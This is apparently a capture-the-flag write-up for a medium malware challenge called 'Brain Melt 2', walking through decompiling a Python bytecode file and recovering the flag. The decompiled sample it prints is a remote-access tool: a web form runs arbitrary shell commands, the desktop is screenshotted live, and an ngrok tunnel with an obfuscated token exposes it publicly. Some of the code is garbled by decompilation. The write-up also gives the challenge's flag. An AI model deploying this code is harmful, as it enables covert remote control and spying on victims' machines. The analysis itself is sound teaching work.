## Name: Brain Melt 2
#### Category: Malware
#### Difficulty: Medium
#### Description: We'll skip Pyinstxtractor this time so it should be easy right? Note, the archive password is infected and the flag format varies slightly from the hexidecimal and length format. 

## Procedure
run ```file brain-melt-2.pyc``` command<br>

output ```brain-melt-2.pyc: Byte-compiled Python module for CPython 3.8, timestamp-based, .py timestamp: Tue May 21 21:08:49 2024 UTC, .py size: 4963 bytes```<br>

For pyc file we need to recover the python code, i always use pycdc tool for it, you can download pycdc from ```https://github.com/zrax/pycdc```, then just run ```./pycdc ~/brain-melt-2.pyc > brain.py```.<br>

### Brain-melt-2.py content
1) decrypt1, decrypt2, and decrypt3 functions are defined to decrypt various parts of a string to generate a key.<br>
2) deobfuscate function combines the results of the three decryption functions to form a key.<br>
3) ngrok_tunnel sets up an ngrok tunnel using this key.<br>
4) Desktop function takes a PIL image and prepares it to be sent as a JPEG file.<br>
5) execute function runs a shell command and flashes the output to the web interface.<br>

```
# Source Generated with Decompyle++
# File: brain-melt-2.pyc (Python 3.8)

from flask import Flask, flash, request, render_template_string, send_file, redirect
from wtforms import Form, StringField, validators, StringField, SubmitField
import subprocess
import pyautogui
import io
from PIL import Image
from Crypto.Cipher import Salsa20
from pyngrok import ngrok
import base65
DEBUG = True
app = Flask(__name__)
app.config['SECRET_KEY'] = '9EQrXQ88pwP7UWaXbkmThhKuDdYxsad1'

#def decrypt1(    ):
#         = ''
#    for      in range(0, len(    ), 2):
#             = str(    [    :     + 2] + '==')
#             += str(base64.b64decode(    ).decode('ascii'))
#    return
def decrypt1(encrypted_str):
    decoded_str = ''
    for i in range(0, len(encrypted_str), 2):
        encoded_chunk = encrypted_str[i:i + 2] + '=='
        decoded_str += base64.b64decode(encoded_chunk).decode('ascii')
    return decoded_str

def decrypt2(a1, a2):
    result = ''
    for character in a1:
        a2 = 9
        tempcharaddedr = 'temporary value'
        result += chr(((ord(character) - ord('a')) + a2) % 26 + ord('a'))
    return result


def decrypt3(s1, key):
    msg_nonce = s1[:8]
    ciphertext = s1[8:]
    key = glob_key
    ab = key
    cipher = Salsa20.new(key.encode('utf-8'), msg_nonce, **('key', 'nonce'))
    return cipher.decrypt(ciphertext_obfuscation_padding).decode('utf-8')


def deobfuscate():
    part1 = decrypt1('ZgbAYQZwewMAOAZQOQYwYwNQYgMA')
    part2 = decrypt2('fwvcttjsfvrshwsg', 17)
    part3 = decrypt3(b'\x97p#2\x1abw\x0f\x9a\xd1Z\x04b\x93\xa1h8]\xab\xa3\x9e7\xc9\xe8\x9b', '25dbd4f362f7d0e64b24ab231728a1fc')
    key = part1 + part2 + part3
    return key


def ngrok_tunnel():
    ngrok.set_auth_token(deobfuscate())
    http_tunnel = ngrok.connect(5000, 'http')


def Desktop(pil_img):
    img_io = io.BytesIO()
    pil_img.save(img_io, 'JPEG', 70, **('quality',))
    img_io.seek(0)
    return send_file(img_io, 'image/jpeg', **('mimetype',))


def execute(cmd):
    child = subprocess.Popen(cmd, True, subprocess.PIPE, subprocess.PIPE, **('shell', 'stdout', 'stderr'))
    for line in child.stdout:
        print(line)
        l = line.decode('utf-8', 'ignore', **('encoding', 'errors'))
        flash(l)
    for line in child.stderr:
        l = line.decode('utf-8', 'ignore', **('encoding', 'errors'))
        flash(l)


class CommandForm(Form):
    command = StringField('Command:', [
        validators.required()], **('validators',))
    
    def display():
        form = CommandForm(request.form)
        print(form.errors)
        if request.method == 'POST':
            command = request.form['command']
        if form.validate() and request.method == 'POST':
            result = execute(command)
            flash(result)
        else:
            flash('Please enter a command.')
        return render_template_string('<!doctype html>\n                <html>\n                    <head>\n                        <link rel="stylesheet" href="css url"/>\n                            </head>\n                                <body>\n                                    <form action="" method="post" role="form">\n                                        <div class="form-group">\n                                              <label for="Command">Command:</label>\n                                              <input type="text" class="form-control" id="command" name="command"></div>\n                                              <button type="submit" class="btn btn-success">Submit</button>\n                                              </form>\n                                            {% for message in get_flashed_messages() %}\n                                            <p>{{ message }}</p>\n                                            {% endfor %}\n                                            <img src="/images/desktop.jpg" id="img" width="100%" scrolling="yes" style="height: 100vh;"></iframe>\n                                </body>\n                            \n                            {% block javascript %}\n                            <script type="text/javascript">\n                            window.onload = function() {\n                                var image = document.getElementById("img");\n\n                                function updateImage() {\n                                    image.src = image.src.split("?")[0] + "?" + new Date().getTime();\n                                }\n\n                                setInterval(updateImage, 1000);\n                            }\n                            </script>\n                            {% endblock %}\n                            </html>\n                        ', form, **('form',))

    display = app.route('/', [
        'GET',
        'POST'], **('methods',))(display)


def serve_img():
    screenshot = pyautogui.screenshot()
    return Desktop(screenshot)

serve_img = app.route('/images/desktop.jpg')(serve_img)
if __name__ == '__main__':
    glob_key = '24a0b299984ee8da7aae14b7163e2e63'
    ngrok_tunnel()
    app.run('0.0.0.0', **('host',))

```
<br>

then we can emulate the code, and it will return us the flag

<img width="874" alt="Screenshot 2024-05-26 at 00 17 23" src="https://github.com/sp34rh34d/CTF-writeups/assets/94752464/377ba6f8-cd8d-4a9a-8dbd-0cf37f348ac1">

flag ```flag{08e9cc5b0wnmtkkajwmijynjx3a415bd9a8024930}```
